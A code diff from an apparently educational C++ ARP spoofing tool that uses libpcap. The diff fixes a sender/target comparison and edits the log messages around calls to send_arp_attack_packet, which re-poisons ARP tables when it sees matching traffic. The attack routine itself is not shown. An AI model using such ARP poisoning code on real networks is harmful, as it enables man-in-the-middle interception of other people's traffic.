@@ -217,7 +217,7 @@ int main(int argc, char* argv[]) {
 
 					for (auto it = lower; it != upper; ++it) {
 						if (it->second == target) {
-							printf("Timestamp: %s %s -> %s", ctime((const time_t*)header->ts.tv_sec), sender, target);
+							printf("Updata Arp Table %s -> %s", string(it->first).c_str(), string(it->second).c_str());
 							send_arp_attack_packet(handle, sender, target, myMac);
 							
 							break;
@@ -229,16 +229,14 @@ int main(int argc, char* argv[]) {
 					auto range = senderTargetMap.equal_range(target);
 					auto lower = range.first;
 					auto upper = range.second;
-					printf("5");
 
 					for (auto it = lower; it != upper; ++it) {
-						if (it->second == target) {
-							printf("Timestamp: %s %s -> %s", ctime((const time_t*)header->ts.tv_sec), sender, target);
+						if (it->second == sender) {
+							printf("Updata Arp Table %s -> %s", string(it->first).c_str(), string(it->second).c_str());
 							send_arp_attack_packet(handle, sender, target, myMac);
 							break;
 						}
 					}
-					printf("6");
 				}
 				break;
 		}
@@ -253,7 +251,6 @@ int main(int argc, char* argv[]) {
 		}
 
 	}
-
 	
 	pcap_close(handle);
 }
